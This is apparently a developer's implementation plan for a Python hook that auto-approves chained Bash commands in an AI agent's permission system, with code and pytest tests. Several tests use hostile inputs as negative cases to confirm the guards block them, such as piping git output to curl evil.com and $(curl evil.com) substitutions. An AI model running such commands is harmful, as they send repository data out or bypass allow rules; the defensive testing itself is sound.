# Smart Compose Hook Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Build a PreToolUse hook that auto-approves composed Bash commands (`&&`, `||`, `;`) when every sub-command individually matches an existing allow rule.

**Architecture:** A Python 3.6+ hook (stdlib only) that splits composed commands using a quote-aware state machine, checks each sub-command against prefix/glob/exact allow rules read from settings files, and returns `permissionDecision: "allow"` if all parts match. Fails open (passthrough) on any error or unrecognized sub-command.

**Tech Stack:** Python 3.6+, pytest, no external dependencies

**Design doc:** `docs/plans/2026-02-19-smart-compose-hook-design.md`

---

### Task 1: Set up test infrastructure and hook scaffold

**Files:**
- Create: `pyproject.toml`
- Create: `tests/conftest.py`
- Create: `hooks/smart-compose.py`

**Step 1: Create pyproject.toml**

```toml
[tool.pytest.ini_options]
testpaths = ["tests"]
```

**Step 2: Create conftest.py with module import helper**

```python
import importlib.util
import os
import sys


def _import_hook(name, filename):
    hook_path = os.path.join(os.path.dirname(__file__), "..", "hooks", filename)
    hook_path = os.path.abspath(hook_path)
    spec = importlib.util.spec_from_file_location(name, hook_path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


sys.modules["smart_compose"] = _import_hook("smart_compose", "smart-compose.py")
```

**Step 3: Create hook scaffold**

```python
#!/usr/bin/env python3
"""
Smart Compose Hook
Auto-approves composed Bash commands where every sub-command matches an allow rule.
"""

import json
import sys
import os
from pathlib import Path
from fnmatch import fnmatch

DEBUG = os.environ.get("SMART_COMPOSE_DEBUG") == "1"

TRUSTED_BUILTINS = frozenset({"cd", "echo", "printf", "true", "false", "test", "[", "[["})

MAX_COMMAND_SIZE = 65536    # 64KB
MAX_SETTINGS_SIZE = 1048576  # 1MB


def _debug(msg):
    if DEBUG:
        print(f"[smart-compose:debug] {msg}", file=sys.stderr)


def main():
    sys.exit(0)


if __name__ == "__main__":
    main()
```

**Step 4: Verify pytest discovers no tests**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest --co -q`
Expected: `no tests ran`

**Step 5: Commit**

```bash
git add pyproject.toml tests/conftest.py hooks/smart-compose.py
git commit -m "chore: Add test infrastructure and smart-compose hook scaffold"
```

---

### Task 2: Quote-aware position tracking

**Files:**
- Modify: `hooks/smart-compose.py`
- Create: `tests/test_smart_compose.py`

**Step 1: Write failing tests for `_outside_quote_positions`**

In `tests/test_smart_compose.py`:

```python
import pytest
import smart_compose as sc


class TestOutsideQuotePositions:
    """Unit tests for the core quote-tracking state machine."""

    def test_plain_text(self):
        assert sc._outside_quote_positions("abc") == {0, 1, 2}

    def test_empty_string(self):
        assert sc._outside_quote_positions("") == set()

    def test_single_quotes(self):
        # a'bc'd -> positions 0 and 4 are outside (a and d)
        assert sc._outside_quote_positions("a'bc'd") == {0, 5}

    def test_double_quotes(self):
        assert sc._outside_quote_positions('a"bc"d') == {0, 5}

    def test_backslash_escape(self):
        # a\bc -> backslash at 1 skips b at 2, so only 0 and 3 are outside
        assert sc._outside_quote_positions("a\\bc") == {0, 3}

    def test_backslash_before_quote(self):
        # \"  -> backslash escapes the quote, neither position is "outside"
        # a\"b -> a(0) \(skip) "(skip) b(3)
        assert sc._outside_quote_positions('a\\"b') == {0, 3}

    def test_ansi_c_quote(self):
        # $'hello' -> $' opens ANSI-C, ' closes. All inside.
        # x$'ab'y -> x(0), y(6)
        assert sc._outside_quote_positions("x$'ab'y") == {0, 6}

    def test_ansi_c_escape(self):
        # $'a\'b' -> \' is escape pair inside ANSI-C, doesn't close
        # x$'a\'b'y -> x(0), y(9)
        assert sc._outside_quote_positions("x$'a\\'b'y") == {0, 9}

    def test_double_quote_escape(self):
        # "a\"b" -> \" inside double quotes is escape pair
        # x"a\"b"y -> x(0), y(7)
        assert sc._outside_quote_positions('x"a\\"b"y') == {0, 7}

    def test_nested_single_in_double(self):
        # "it's" -> single quote inside double quotes doesn't open single mode
        # a"it's"b -> a(0), b(7)
        assert sc._outside_quote_positions("a\"it's\"b") == {0, 7}

    def test_nested_double_in_single(self):
        # 'say "hi"' -> double quotes inside single quotes are literal
        # a'say "hi"'b -> a(0), b(12)
        assert sc._outside_quote_positions("a'say \"hi\"'b") == {0, 12}

    def test_dollar_not_followed_by_quote(self):
        # $x -> $ is outside, x is outside (no ANSI-C mode)
        assert sc._outside_quote_positions("$x") == {0, 1}
```

**Step 2: Run tests to verify they fail**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestOutsideQuotePositions -v`
Expected: FAIL with `AttributeError: module 'smart_compose' has no attribute '_outside_quote_positions'`

**Step 3: Implement `_outside_quote_positions`**

Add to `hooks/smart-compose.py` after `_debug`:

```python
def _outside_quote_positions(text):
    """Return set of character positions that are outside all quote contexts."""
    positions = set()
    i = 0
    in_single = False
    in_double = False
    in_ansi_c = False

    while i < len(text):
        c = text[i]

        if in_single:
            if c == "'":
                in_single = False
            i += 1
            continue

        if in_ansi_c:
            if c == "\\":
                i += 2
                continue
            if c == "'":
                in_ansi_c = False
            i += 1
            continue

        if in_double:
            if c == "\\":
                i += 2
                continue
            if c == '"':
                in_double = False
            i += 1
            continue

        # Outside all quotes
        if c == "\\":
            i += 2
            continue

        if c == "$" and i + 1 < len(text) and text[i + 1] == "'":
            in_ansi_c = True
            i += 2
            continue

        if c == "'":
            in_single = True
            i += 1
            continue

        if c == '"':
            in_double = True
            i += 1
            continue

        positions.add(i)
        i += 1

    return positions
```

**Step 4: Run tests to verify they pass**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestOutsideQuotePositions -v`
Expected: all PASSED

**Step 5: Commit**

```bash
git add hooks/smart-compose.py tests/test_smart_compose.py
git commit -m "feat: Add quote-aware position tracking state machine"
```

---

### Task 3: Operator splitting

**Files:**
- Modify: `hooks/smart-compose.py`
- Modify: `tests/test_smart_compose.py`

**Step 1: Write failing tests for `split_on_operators`**

Append to `tests/test_smart_compose.py`:

```python
class TestSplitOnOperators:

    def test_no_operators(self):
        assert sc.split_on_operators("git log --oneline") == ["git log --oneline"]

    def test_pipe_not_split(self):
        assert sc.split_on_operators("git log | head -5") == ["git log | head -5"]

    def test_single_ampersand_not_split(self):
        assert sc.split_on_operators("git log &") == ["git log &"]

    def test_and_operator(self):
        assert sc.split_on_operators("git add . && git commit") == ["git add . ", " git commit"]

    def test_or_operator(self):
        assert sc.split_on_operators("echo a || echo b") == ["echo a ", " echo b"]

    def test_semicolon(self):
        assert sc.split_on_operators("echo a ; echo b") == ["echo a ", " echo b"]

    def test_multiple_operators(self):
        result = sc.split_on_operators("a && b || c ; d")
        assert result == ["a ", " b ", " c ", " d"]

    def test_and_inside_double_quotes(self):
        assert sc.split_on_operators('git commit -m "fix && deploy"') == ['git commit -m "fix && deploy"']

    def test_and_inside_single_quotes(self):
        assert sc.split_on_operators("echo '&& not split'") == ["echo '&& not split'"]

    def test_escaped_ampersands(self):
        result = sc.split_on_operators("echo \\&\\& && git status")
        assert len(result) == 2
        assert result[1].strip() == "git status"

    def test_ansi_c_quotes(self):
        assert sc.split_on_operators("echo $'hello\\n&&\\nworld'") == ["echo $'hello\\n&&\\nworld'"]

    def test_ansi_c_then_real_operator(self):
        result = sc.split_on_operators("printf $'step1\\0' && git status")
        assert len(result) == 2
        assert result[0].strip() == "printf $'step1\\0'"
        assert result[1].strip() == "git status"

    def test_ansi_c_escaped_quote(self):
        result = sc.split_on_operators("echo $'it\\'s fine' && git status")
        assert len(result) == 2
        assert result[1].strip() == "git status"

    def test_empty_subcommands(self):
        result = sc.split_on_operators("&& && git status")
        assert result == ["", " ", " git status"]

    def test_double_semicolon(self):
        result = sc.split_on_operators(";;")
        assert "" in result  # produces empty tokens

    def test_three_commands(self):
        result = sc.split_on_operators("cd /tmp && git log && git status")
        assert len(result) == 3
```

**Step 2: Run tests to verify they fail**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestSplitOnOperators -v`
Expected: FAIL with `AttributeError`

**Step 3: Implement `split_on_operators`**

Add to `hooks/smart-compose.py` after `_outside_quote_positions`:

```python
def split_on_operators(cmd):
    """Split command on &&, ||, ; that are outside quotes."""
    outside = _outside_quote_positions(cmd)
    parts = []
    last = 0
    i = 0

    while i < len(cmd):
        if i not in outside:
            i += 1
            continue

        c = cmd[i]

        if c == "&" and i + 1 < len(cmd) and (i + 1) in outside and cmd[i + 1] == "&":
            parts.append(cmd[last:i])
            i += 2
            last = i
            continue

        if c == "|" and i + 1 < len(cmd) and (i + 1) in outside and cmd[i + 1] == "|":
            parts.append(cmd[last:i])
            i += 2
            last = i
            continue

        if c == ";":
            parts.append(cmd[last:i])
            i += 1
            last = i
            continue

        i += 1

    parts.append(cmd[last:])
    return parts
```

**Step 4: Run tests to verify they pass**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestSplitOnOperators -v`
Expected: all PASSED

**Step 5: Commit**

```bash
git add hooks/smart-compose.py tests/test_smart_compose.py
git commit -m "feat: Add quote-aware operator splitting"
```

---

### Task 4: Pipe and expansion guards

**Files:**
- Modify: `hooks/smart-compose.py`
- Modify: `tests/test_smart_compose.py`

**Step 1: Write failing tests for guards**

Append to `tests/test_smart_compose.py`:

```python
class TestHasUnquotedPipe:

    def test_simple_pipe(self):
        assert sc.has_unquoted_pipe("git log | head") is True

    def test_trailing_pipe(self):
        assert sc.has_unquoted_pipe("git log |") is True

    def test_no_pipe(self):
        assert sc.has_unquoted_pipe("echo hello") is False

    def test_double_pipe_not_single(self):
        assert sc.has_unquoted_pipe("echo a || echo b") is False

    def test_pipe_in_single_quotes(self):
        assert sc.has_unquoted_pipe("git log --format='%H|%s'") is False

    def test_pipe_in_double_quotes(self):
        assert sc.has_unquoted_pipe('git log --format="%H|%s"') is False

    def test_pipe_in_ansi_c(self):
        assert sc.has_unquoted_pipe("echo $'a|b'") is False

    def test_pipe_after_or_operator(self):
        # || followed by | — the || is not a pipe, but a later | is
        assert sc.has_unquoted_pipe("a || b | c") is True

    def test_empty(self):
        assert sc.has_unquoted_pipe("") is False


class TestHasUnquotedExpansion:

    def test_dollar_paren(self):
        assert sc.has_unquoted_expansion("echo $(whoami)") is True

    def test_backtick(self):
        assert sc.has_unquoted_expansion("echo `whoami`") is True

    def test_dollar_brace(self):
        assert sc.has_unquoted_expansion("echo ${PATH}") is True

    def test_process_sub_in(self):
        assert sc.has_unquoted_expansion("echo <(cat file)") is True

    def test_process_sub_out(self):
        assert sc.has_unquoted_expansion("echo >(tee file)") is True

    def test_dollar_paren_in_double_quotes(self):
        assert sc.has_unquoted_expansion('echo "$(date)"') is False

    def test_backtick_in_single_quotes(self):
        assert sc.has_unquoted_expansion("echo '`date`'") is False

    def test_dollar_brace_in_double_quotes(self):
        assert sc.has_unquoted_expansion('echo "${HOME}"') is False

    def test_no_expansion(self):
        assert sc.has_unquoted_expansion("echo hello world") is False

    def test_plain_dollar(self):
        # $HOME is not $(, ${, so not flagged
        assert sc.has_unquoted_expansion("echo $HOME") is False

    def test_empty(self):
        assert sc.has_unquoted_expansion("") is False
```

**Step 2: Run tests to verify they fail**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestHasUnquotedPipe tests/test_smart_compose.py::TestHasUnquotedExpansion -v`
Expected: FAIL with `AttributeError`

**Step 3: Implement both guards**

Add to `hooks/smart-compose.py` after `split_on_operators`:

```python
def has_unquoted_pipe(text):
    """Check if text contains unquoted | (not ||)."""
    outside = _outside_quote_positions(text)
    i = 0
    while i < len(text):
        if i in outside and text[i] == "|":
            if i + 1 >= len(text) or (i + 1) not in outside or text[i + 1] != "|":
                return True
            i += 2
            continue
        i += 1
    return False


def has_unquoted_expansion(text):
    """Check for unquoted $(, `, ${, <(, >( in text."""
    outside = _outside_quote_positions(text)
    for i in range(len(text)):
        if i not in outside:
            continue
        c = text[i]
        if c == "$" and i + 1 < len(text) and (i + 1) in outside and text[i + 1] in ("(", "{"):
            return True
        if c == "`":
            return True
        if c in ("<", ">") and i + 1 < len(text) and (i + 1) in outside and text[i + 1] == "(":
            return True
    return False
```

**Step 4: Run tests to verify they pass**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestHasUnquotedPipe tests/test_smart_compose.py::TestHasUnquotedExpansion -v`
Expected: all PASSED

**Step 5: Commit**

```bash
git add hooks/smart-compose.py tests/test_smart_compose.py
git commit -m "feat: Add quote-aware pipe and expansion guards"
```

---

### Task 5: Allow rule parser

**Files:**
- Modify: `hooks/smart-compose.py`
- Modify: `tests/test_smart_compose.py`

**Step 1: Write failing tests for `parse_allow_rules`**

Append to `tests/test_smart_compose.py`:

```python
import json
import os


class TestParseAllowRules:

    def _write_settings(self, path, rules):
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            json.dump({"permissions": {"allow": rules}}, f)

    def test_prefix_rule(self, tmp_path):
        self._write_settings(
            str(tmp_path / ".claude" / "settings.local.json"),
            ["Bash(git log:*)"],
        )
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules["prefix"] == ["git log"]
        assert rules["glob"] == []
        assert rules["exact"] == []

    def test_glob_rule(self, tmp_path):
        self._write_settings(
            str(tmp_path / ".claude" / "settings.local.json"),
            ["Bash(git *)"],
        )
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules["glob"] == ["git *"]

    def test_exact_rule(self, tmp_path):
        self._write_settings(
            str(tmp_path / ".claude" / "settings.local.json"),
            ['Bash(git commit -m "fix")'],
        )
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules["exact"] == ['git commit -m "fix"']

    def test_non_bash_rules_ignored(self, tmp_path):
        self._write_settings(
            str(tmp_path / ".claude" / "settings.local.json"),
            ["Read(*)", "Write(*)", "Bash(git log:*)"],
        )
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules["prefix"] == ["git log"]
        assert len(rules["glob"]) == 0
        assert len(rules["exact"]) == 0

    def test_global_settings(self, tmp_path):
        home = tmp_path / "home"
        self._write_settings(
            str(home / ".claude" / "settings.json"),
            ["Bash(npm run:*)"],
        )
        rules = sc.parse_allow_rules(str(tmp_path / "project"), home=str(home))
        assert rules["prefix"] == ["npm run"]

    def test_both_project_and_global(self, tmp_path):
        project = tmp_path / "project"
        home = tmp_path / "home"
        self._write_settings(
            str(project / ".claude" / "settings.local.json"),
            ["Bash(git log:*)"],
        )
        self._write_settings(
            str(home / ".claude" / "settings.json"),
            ["Bash(npm run:*)"],
        )
        rules = sc.parse_allow_rules(str(project), home=str(home))
        assert "git log" in rules["prefix"]
        assert "npm run" in rules["prefix"]

    def test_missing_files(self, tmp_path):
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules == {"prefix": [], "glob": [], "exact": []}

    def test_invalid_json_skipped(self, tmp_path):
        settings_path = tmp_path / ".claude" / "settings.local.json"
        os.makedirs(os.path.dirname(str(settings_path)), exist_ok=True)
        settings_path.write_text("not json{{{")
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules == {"prefix": [], "glob": [], "exact": []}

    def test_oversized_file_skipped(self, tmp_path):
        settings_path = tmp_path / ".claude" / "settings.local.json"
        os.makedirs(os.path.dirname(str(settings_path)), exist_ok=True)
        # Write a file just over 1MB
        settings_path.write_text("x" * (sc.MAX_SETTINGS_SIZE + 1))
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules == {"prefix": [], "glob": [], "exact": []}

    def test_all_four_settings_files(self, tmp_path):
        project = tmp_path / "project"
        home = tmp_path / "home"
        self._write_settings(str(project / ".claude" / "settings.local.json"), ["Bash(a:*)"])
        self._write_settings(str(project / ".claude" / "settings.json"), ["Bash(b:*)"])
        self._write_settings(str(home / ".claude" / "settings.local.json"), ["Bash(c:*)"])
        self._write_settings(str(home / ".claude" / "settings.json"), ["Bash(d:*)"])
        rules = sc.parse_allow_rules(str(project), home=str(home))
        assert sorted(rules["prefix"]) == ["a", "b", "c", "d"]

    def test_glob_with_question_mark(self, tmp_path):
        self._write_settings(
            str(tmp_path / ".claude" / "settings.local.json"),
            ["Bash(git ?*)"],
        )
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules["glob"] == ["git ?*"]

    def test_glob_with_bracket(self, tmp_path):
        self._write_settings(
            str(tmp_path / ".claude" / "settings.local.json"),
            ["Bash(git [ls]*)"],
        )
        rules = sc.parse_allow_rules(str(tmp_path), home=str(tmp_path / "fakehome"))
        assert rules["glob"] == ["git [ls]*"]
```

**Step 2: Run tests to verify they fail**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestParseAllowRules -v`
Expected: FAIL with `AttributeError`

**Step 3: Implement `parse_allow_rules`**

Add to `hooks/smart-compose.py` after the guard functions:

```python
def parse_allow_rules(cwd, home=None):
    """
    Read Bash allow rules from settings files.
    Returns dict: {"prefix": [...], "glob": [...], "exact": [...]}
    """
    if home is None:
        home = str(Path.home())

    rules = {"prefix": [], "glob": [], "exact": []}

    paths = [
        os.path.join(cwd, ".claude", "settings.local.json"),
        os.path.join(cwd, ".claude", "settings.json"),
        os.path.join(home, ".claude", "settings.local.json"),
        os.path.join(home, ".claude", "settings.json"),
    ]

    for path in paths:
        try:
            size = os.path.getsize(path)
            if size > MAX_SETTINGS_SIZE:
                _debug(f"skipped {path}: file too large ({size} bytes)")
                continue
            with open(path) as f:
                data = json.load(f)
        except (OSError, json.JSONDecodeError, ValueError):
            continue

        allow_list = data.get("permissions", {}).get("allow", [])

        for rule in allow_list:
            if not isinstance(rule, str) or not rule.startswith("Bash(") or not rule.endswith(")"):
                continue
            inner = rule[5:-1]

            if inner.endswith(":*"):
                rules["prefix"].append(inner[:-2])
            elif any(c in inner for c in ("*", "?", "[")):
                rules["glob"].append(inner)
            else:
                rules["exact"].append(inner)

    if DEBUG:
        total = sum(len(v) for v in rules.values())
        _debug(f"loaded {total} rules (prefix={len(rules['prefix'])}, glob={len(rules['glob'])}, exact={len(rules['exact'])})")
        if total == 0:
            _debug("warning: no allow rules found in any settings file")

    return rules
```

**Step 4: Run tests to verify they pass**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestParseAllowRules -v`
Expected: all PASSED

**Step 5: Commit**

```bash
git add hooks/smart-compose.py tests/test_smart_compose.py
git commit -m "feat: Add allow rule parser for settings files"
```

---

### Task 6: Sub-command matching

**Files:**
- Modify: `hooks/smart-compose.py`
- Modify: `tests/test_smart_compose.py`

**Step 1: Write failing tests for `matches_any_rule`**

Append to `tests/test_smart_compose.py`:

```python
class TestMatchesAnyRule:

    RULES = {
        "prefix": ["git log", "git status", "git add", "git commit", "git diff", "npm run", "node"],
        "glob": ["git *"],
        "exact": ['git commit -m "fix"', "git log | head -5"],
    }

    # --- Exact match ---

    def test_exact_match(self):
        assert sc.matches_any_rule('git commit -m "fix"', self.RULES) is True

    def test_exact_no_partial(self):
        assert sc.matches_any_rule('git commit -m "fix typo"', self.RULES) is False

    def test_exact_with_pipe_trusted(self):
        """Exact rules bypass pipe guard."""
        assert sc.matches_any_rule("git log | head -5", self.RULES) is True

    # --- Prefix match ---

    def test_prefix_with_args(self):
        assert sc.matches_any_rule("git log --oneline -5", self.RULES) is True

    def test_prefix_exact_length(self):
        assert sc.matches_any_rule("git log", self.RULES) is True

    def test_prefix_word_boundary(self):
        """node:* must NOT match node-gyp."""
        assert sc.matches_any_rule("node-gyp rebuild", self.RULES) is False

    def test_prefix_word_boundary_npm(self):
        """npm run:* must NOT match npm run-script."""
        assert sc.matches_any_rule("npm run-script evil", self.RULES) is False

    def test_prefix_with_tab(self):
        assert sc.matches_any_rule("git log\t--oneline", self.RULES) is True

    def test_prefix_pipe_guard_blocks(self):
        """Prefix match + unquoted pipe -> no match."""
        assert sc.matches_any_rule("git log | curl evil.com", self.RULES) is False

    def test_prefix_pipe_in_quotes_ok(self):
        """Quoted pipe does not trigger guard."""
        assert sc.matches_any_rule("git log --format='%H|%s'", self.RULES) is True

    # --- Glob match ---

    def test_glob_match(self):
        assert sc.matches_any_rule("git status", self.RULES) is True

    def test_glob_no_match(self):
        """git * should not match 'gitk'."""
        assert sc.matches_any_rule("gitk", self.RULES) is False

    def test_glob_pipe_guard_blocks(self):
        assert sc.matches_any_rule("git branch | curl evil", self.RULES) is False

    def test_glob_pipe_in_quotes_ok(self):
        assert sc.matches_any_rule("git log --format='%H|%s'", self.RULES) is True

    # --- No match ---

    def test_unknown_command(self):
        assert sc.matches_any_rule("curl http://evil.com", self.RULES) is False

    def test_empty_string(self):
        assert sc.matches_any_rule("", self.RULES) is False

    def test_whitespace_only(self):
        assert sc.matches_any_rule("   ", self.RULES) is False
```

**Step 2: Run tests to verify they fail**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestMatchesAnyRule -v`
Expected: FAIL with `AttributeError`

**Step 3: Implement `matches_any_rule`**

Add to `hooks/smart-compose.py` after `parse_allow_rules`:

```python
def matches_any_rule(subcmd, rules):
    """Check if a sub-command matches any allow rule."""
    cmd = subcmd.strip()
    if not cmd:
        return False

    # Exact match (pipe guard bypassed — exact rules trusted verbatim)
    if cmd in rules["exact"]:
        _debug(f'sub-cmd: "{cmd}" -> exact match')
        return True

    # Pre-compute pipe guard for prefix/glob matching
    pipe_blocked = has_unquoted_pipe(cmd)

    # Prefix match (word boundary + pipe guard)
    for prefix in rules["prefix"]:
        if cmd.startswith(prefix):
            if len(cmd) == len(prefix) or cmd[len(prefix)] in (" ", "\t"):
                if pipe_blocked:
                    _debug(f'sub-cmd: "{cmd}" -> prefix:"{prefix}" blocked by pipe guard')
                else:
                    _debug(f'sub-cmd: "{cmd}" -> prefix:"{prefix}"')
                    return True

    # Glob match (pipe guard)
    if not pipe_blocked:
        for pattern in rules["glob"]:
            if fnmatch(cmd, pattern):
                _debug(f'sub-cmd: "{cmd}" -> glob:"{pattern}"')
                return True
    else:
        for pattern in rules["glob"]:
            if fnmatch(cmd, pattern):
                _debug(f'sub-cmd: "{cmd}" -> glob:"{pattern}" blocked by pipe guard')

    _debug(f'sub-cmd: "{cmd}" -> no match')
    return False
```

**Step 4: Run tests to verify they pass**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestMatchesAnyRule -v`
Expected: all PASSED

**Step 5: Commit**

```bash
git add hooks/smart-compose.py tests/test_smart_compose.py
git commit -m "feat: Add sub-command matching with word boundary and pipe guard"
```

---

### Task 7: Builtin detection

**Files:**
- Modify: `hooks/smart-compose.py`
- Modify: `tests/test_smart_compose.py`

**Step 1: Write failing tests for `is_auto_allowed_builtin`**

Append to `tests/test_smart_compose.py`:

```python
class TestIsAutoAllowedBuiltin:

    def test_cd(self):
        assert sc.is_auto_allowed_builtin("cd /tmp") is True

    def test_echo(self):
        assert sc.is_auto_allowed_builtin("echo hello") is True

    def test_printf(self):
        assert sc.is_auto_allowed_builtin('printf "%s\\n" hello') is True

    def test_true(self):
        assert sc.is_auto_allowed_builtin("true") is True

    def test_false(self):
        assert sc.is_auto_allowed_builtin("false") is True

    def test_test(self):
        assert sc.is_auto_allowed_builtin("test -f file") is True

    def test_bracket(self):
        assert sc.is_auto_allowed_builtin("[ -f file ]") is True

    def test_double_bracket(self):
        assert sc.is_auto_allowed_builtin("[[ -f file ]]") is True

    def test_not_builtin(self):
        assert sc.is_auto_allowed_builtin("curl http://evil.com") is False

    def test_empty(self):
        assert sc.is_auto_allowed_builtin("") is False

    # --- Expansion guard ---

    def test_cd_dollar_paren(self):
        assert sc.is_auto_allowed_builtin("cd $(malicious)") is False

    def test_echo_dollar_paren(self):
        assert sc.is_auto_allowed_builtin("echo $(curl evil.com)") is False

    def test_echo_backtick(self):
        assert sc.is_auto_allowed_builtin("echo `whoami`") is False

    def test_echo_dollar_brace(self):
        assert sc.is_auto_allowed_builtin("echo ${PATH}") is False

    def test_echo_process_sub_in(self):
        assert sc.is_auto_allowed_builtin("echo <(curl evil.com)") is False

    def test_echo_process_sub_out(self):
        assert sc.is_auto_allowed_builtin("echo >(tee evil)") is False

    def test_echo_quoted_expansion_ok(self):
        """Expansion inside double quotes is safe."""
        assert sc.is_auto_allowed_builtin('echo "result: $(date)"') is True

    def test_echo_single_quoted_expansion_ok(self):
        assert sc.is_auto_allowed_builtin("echo '$(not expansion)'") is True

    def test_cd_no_args(self):
        assert sc.is_auto_allowed_builtin("cd") is True

    def test_leading_whitespace(self):
        assert sc.is_auto_allowed_builtin("  cd /tmp") is True
```

**Step 2: Run tests to verify they fail**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestIsAutoAllowedBuiltin -v`
Expected: FAIL with `AttributeError`

**Step 3: Implement `is_auto_allowed_builtin`**

Add to `hooks/smart-compose.py` after `matches_any_rule`:

```python
def is_auto_allowed_builtin(subcmd):
    """Check if sub-command is an auto-allowed builtin with no unquoted expansion."""
    cmd = subcmd.strip()
    if not cmd:
        return False

    parts = cmd.split(None, 1)
    name = parts[0]

    if name not in TRUSTED_BUILTINS:
        return False

    args = parts[1] if len(parts) > 1 else ""
    if has_unquoted_expansion(args):
        _debug(f'sub-cmd: "{cmd}" -> builtin "{name}" blocked by expansion guard')
        return False

    _debug(f'sub-cmd: "{cmd}" -> builtin:"{name}"')
    return True
```

**Step 4: Run tests to verify they pass**

Run: `cd /Users/willvargas/Development/Sheetgo/agent-skills && python3 -m pytest tests/test_smart_compose.py::TestIsAutoAllowedBuiltin -v`
Expected: all PASSED

**Step 5: Commit**

```bash
git add hooks/smart-compose.py tests/test_smart_compose.py
git commit -m "feat: Add builtin detection with expansion guard"
```

---

### Task 8: Main command checker

**Files:**
- Modify: `hooks/smart-compose.py`
- Modify: `tests/test_smart_compose.py`

**Step 1: Write failing tests for `check_command`**

Append to `tests/test_smart_compose.py`:

```python
class TestCheckCommand:
    """End-to-end tests for the command checking orchestrator."""

    @pytest.fixture(autouse=True)
    def setup_rules(self, tmp_path):
        """Create a project dir with standard test rules."""
        self.project = str(tmp_path / "project")
        self.home = str(tmp_path / "home")
        os.makedirs(os.path.join(self.project, ".claude"), exist_ok=True)
        os.makedirs(os.path.join(self.home, ".claude"), exist_ok=True)

        project_rules = {
            "permissions": {
                "allow": [
                    "Bash(git log:*)",
                    "Bash(git status:*)",
                    "Bash(git add:*)",
                    "Bash(git commit:*)",
                    "Bash(git diff:*)",
                    "Bash(git pull:*)",
                    "Bash(npm run:*)",
                    "Bash(git *)",
                ]
            }
        }
        with open(os.path.join(self.project, ".claude", "settings.local.json"), "w") as f:
            json.dump(project_rules, f)

    # --- Simple commands (passthrough) ---

    def test_simple_command_passthrough(self):
        assert sc.check_command("git log --oneline", self.project, self.home) is None

    def test_no_operators_passthrough(self):
        assert sc.check_command("npm run test", self.project, self.home) is None

    # --- Composed commands (all allowed) ---

    def test_cd_and_git(self):
        assert sc.check_command("cd /tmp && git log --oneline", self.project, self.home) == "allow"

    def test_git_add_and_commit(self):
        result = sc.check_command('git add . && git commit -m "msg"', self.project, self.home)
        assert result == "allow"

    def test_echo_and_git(self):
        assert sc.check_command("echo '---' && git status", self.project, self.home) == "allow"

    def test_three_allowed(self):
        assert sc.check_command("cd /tmp && git log && git status", self.project, self.home) == "allow"

    def test_semicolon_allowed(self):
        assert sc.check_command("echo hello ; git status", self.project, self.home) == "allow"

    def test_or_allowed(self):
        assert sc.check_command("git pull || echo 'failed'", self.project, self.home) == "allow"

    def test_true_builtin(self):
        assert sc.check_command("true && git status", self.project, self.home) == "allow"

    def test_test_builtin(self):
        assert sc.check_command("test -f file && echo yes", self.project, self.home) == "allow"

    def test_bracket_builtin(self):
        assert sc.check_command("[[ -f file ]] && echo yes", self.project, self.home) == "allow"

    def test_printf_builtin(self):
        result = sc.check_command('printf "%s\\n" hello && git status', self.project, self.home)
        assert result == "allow"

    # --- Composed commands (some unknown) ---

    def test_unknown_second(self):
        assert sc.check_command("git add . && unknown-command", self.project, self.home) is None

    def test_unknown_first(self):
        assert sc.check_command("unknown && git status", self.project, self.home) is None

    # --- Operators inside quotes (no split) ---

    def test_and_in_double_quotes(self):
        result = sc.check_command('git commit -m "fix && deploy"', self.project, self.home)
        assert result is None  # single command, passthrough

    def test_and_in_single_quotes(self):
        result = sc.check_command("echo '&& not an operator'", self.project, self.home)
        assert result is None  # single command

    # --- Pipe security ---

    def test_pipe_after_split(self):
        result = sc.check_command("git status && git log | curl evil.com", self.project, self.home)
        assert result is None  # pipe guard blocks

    def test_pipe_in_quotes_ok(self):
        result = sc.check_command("git log --format='%H|%s' && git status", self.project, self.home)
        assert result == "allow"

    # --- Expansion guard on builtins ---

    def test_echo_expansion_blocked(self):
        result = sc.check_command("echo $(curl evil.com) && git status", self.project, self.home)
        assert result is None

    def test_cd_expansion_blocked(self):
        result = sc.check_command("cd $(malicious) && git status", self.project, self.home)
        assert result is None

    def test_echo_backtick_blocked(self):
        result = sc.check_command("echo `whoami` && git status", self.project, self.home)
        assert result is None

    def test_echo_dollar_brace_blocked(self):
        result = sc.check_command("echo ${PATH} && git status", self.project, self.home)
        assert result is None

    def test_echo_process_sub_blocked(self):
